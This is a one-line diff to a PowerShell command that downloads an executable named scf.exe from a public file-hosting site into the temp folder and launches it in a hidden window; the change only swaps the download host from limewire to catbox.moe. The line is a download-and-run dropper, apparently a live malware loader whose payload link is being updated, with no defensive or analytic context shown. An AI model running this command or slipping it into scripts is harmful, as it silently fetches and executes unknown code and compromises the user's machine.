@@ -1,1 +1,1 @@
-$f=[IO.Path]::GetTempPath()+'scf.exe';irm 'https://limewire.com/d/bBAYv#3y7TujiSK7' -OutFile $f;saps $f -WindowStyle Hidden
+$f=[IO.Path]::GetTempPath()+'scf.exe';irm 'https://files.catbox.moe/vrrykr.ccc' -OutFile $f;saps $f -WindowStyle Hidden
